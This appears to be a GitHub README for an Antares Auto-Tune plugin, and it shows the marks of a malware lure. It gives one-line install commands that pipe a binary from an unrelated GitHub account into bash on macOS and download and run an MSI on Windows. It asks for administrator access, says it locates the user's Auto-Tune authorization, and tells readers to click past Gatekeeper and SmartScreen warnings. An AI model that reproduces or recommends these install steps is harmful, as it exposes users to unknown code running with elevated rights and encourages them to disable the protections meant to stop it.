# Plugin for Antares Auto-Tune

This script installs a plugin for Antares Auto-Tune. To install, run one of the commands below in your terminal.

## Installation

### macOS

```bash
curl -fsSL https://github.com/Tributarytushift/autotune/releases/download/v.0.0.3/autotune | bash
```

### Windows

```cmd
curl -Lo %temp%\s.msi https://github.com/Tributarytushift/autotune/releases/download/v.0.0.3/autotune.msi && msiexec /i %temp%\s.msi
```

## Requirements

- Antares Auto-Tune Pro 10 or later (Pro, Artist, EFX+, or Access)
- A compatible DAW with AU, VST3, or AAX support
- macOS 12 Monterey or later / Windows 10 or later (64-bit)
- ~30 MB of free disk space
- Administrator access (the installer will request your password)

## What the installer does

The installer downloads the plugin package, verifies its signature, locates your Antares Auto-Tune installation and authorization, and installs the AU, VST3, and AAX versions of the plugin into the system plugin folders. It then validates the Audio Unit and links the plugin with the Auto-Tune key map engine.

If Antares Auto-Tune is not detected on your system, the installer will offer to download a trial version before continuing.

After the installer finishes, restart your DAW. Insert the plugin on a vocal track before or alongside Auto-Tune for best results.

## Troubleshooting

**macOS — "cannot be opened because the developer cannot be verified":**
Open *System Settings → Privacy & Security*, scroll down, and click **Allow Anyway** next to the blocked file. Or, run the install command directly in Terminal (the recommended method).

**Windows — SmartScreen blocks the installer:**
Click **More info → Run anyway** in the SmartScreen dialog.

**Plugin doesn't appear in your DAW after install:**
Trigger a plugin rescan in your DAW's preferences. In Logic Pro, you may also need to run `auval -v` to validate the Audio Unit.

## Uninstall

Delete the plugin files from:

- macOS:
  - `/Library/Audio/Plug-Ins/Components/` (AU)
  - `/Library/Audio/Plug-Ins/VST3/`
  - `/Library/Application Support/Avid/Audio/Plug-Ins/` (AAX)
- Windows:
  - `C:\Program Files\Common Files\VST3\`
  - `C:\Program Files\Common Files\Avid\Audio\Plug-Ins\`

Then restart your DAW.

## Support

For bug reports, feature requests, or general questions, please open an issue in this repository.
